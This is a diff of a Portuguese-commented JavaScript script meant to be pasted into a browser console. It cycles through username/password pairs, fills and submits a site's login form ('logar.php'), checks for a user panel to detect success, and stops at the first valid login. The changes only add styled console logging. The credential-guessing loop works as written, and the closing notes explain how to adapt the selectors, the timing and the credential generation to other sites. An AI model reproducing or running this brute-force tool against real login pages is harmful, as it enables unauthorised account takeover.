@@ -15,7 +15,7 @@ let pararExecucao = false;
 // Função para parar a execução
 function stop() {
     pararExecucao = true;
-    console.warn('%cExecução interrompida pelo usuário.', 'color: orange;');
+    console.warn('%c[AVISO] Execução interrompida pelo usuário.', 'color: orange; font-weight: bold;');
 }
 
 // Exponha a função stop no escopo global (window) para que possa ser chamada no console.
@@ -23,46 +23,67 @@ window.stop = stop;
 
 // Tenta o login com um usuário e senha.
 async function tentarLogin(usuario, senha) {
+    console.groupCollapsed(`%c[TENTATIVA] ${usuario}/${senha}`, 'color: DodgerBlue; font-weight: bold;'); // Inicia grupo recolhido
+
     // Encontra os campos e o formulário (ADAPTAR OS SELECTORES!).
     const usuarioInput = document.querySelector('input[name="login"]');
     const senhaInput = document.querySelector('input[name="pass"]');
     const form = document.querySelector('form[action="logar.php"]');
 
-    if (!usuarioInput || !senhaInput || !form) return false; // Elementos não encontrados.
+    if (!usuarioInput || !senhaInput || !form) {
+        console.error("%c[ERRO] Elementos do formulário não encontrados. Verifique os seletores!", "color: Crimson; font-weight: bold;");
+        console.groupEnd(); // Finaliza grupo
+        return false; // Elementos não encontrados.
+    }
 
+    console.log("%c[INFO] Preenchendo campos de login...", 'color: SlateGray');
     usuarioInput.value = usuario;
     senhaInput.value = senha;
+
+    console.log("%c[INFO] Submetendo formulário...", 'color: SlateGray');
     form.submit();
 
+    console.log("%c[INFO] Aguardando resposta do servidor...", 'color: SlateGray');
     await new Promise(resolve => setTimeout(resolve, 2500)); // Aguarda (AJUSTAR O TEMPO).
 
     // Verifica se o login foi bem-sucedido (ADAPTAR A LÓGICA!).
     const painelUsuario = document.querySelector('#painel_usuario');
+
     if (painelUsuario) {
-        console.log(`%cSucesso: ${usuario}/${senha}`, 'color: green;'); // Login bem-sucedido!
+        console.log(`%c[SUCESSO] Login com ${usuario}/${senha}`, 'color: green; font-weight: bold;'); // Login bem-sucedido!
+        console.groupEnd(); // Finaliza grupo
         return true;
     } else {
-        console.error(`%cFalha: ${usuario}/${senha}`, 'color: red;'); // Login falhou!
+        console.error(`%c[FALHA] Login com ${usuario}/${senha}`, 'color: red; font-weight: bold;'); // Login falhou!
+        console.groupEnd(); // Finaliza grupo
         return false;
     }
 }
 
 // Executa os testes de login.
 async function executarTestes() {
+    console.group("%cIniciando Testes de Login Automatizados", "color: Gold; font-size: 1.2em; font-weight: bold;");
+
     for (let i = 0; i < usuarios.length; i++) {
         if (pararExecucao) {
-            console.log('%cExecução finalizada.', 'color: orange;');
+            console.log('%c[INFO] Execução finalizada.', 'color: orange; font-weight: bold;');
+            console.groupEnd();
             return;
         }
 
         const usuario = usuarios[i];
         const senha = senhas[i];
 
-        console.log(`Testando: ${usuario}/${senha}`);
+        console.log(`%c[PROCESSO] Testando: ${usuario}/${senha} (${i + 1}/${usuarios.length})`, 'color: RoyalBlue');
 
-        if (await tentarLogin(usuario, senha)) return; // Para ao encontrar um login válido.
+        if (await tentarLogin(usuario, senha)) {
+            console.groupEnd();
+            return; // Para ao encontrar um login válido.
+        }
     }
-    console.log('%cFalha: Nenhuma combinação funcionou.', 'color: red;');
+
+    console.log('%c[RESULTADO] Nenhuma combinação funcionou.', 'color: red; font-weight: bold;');
+    console.groupEnd();
 }
 
 executarTestes();
@@ -72,4 +93,5 @@ executarTestes();
 2. Adapte os seletores CSS em `tentarLogin()`.
 3. Adapte a lógica de sucesso em `tentarLogin()`.
 4. Ajuste o tempo de espera.
-5. Modifique a geração de usuários/senhas. */
+5. Modifique a geração de usuários/senhas.
+*/
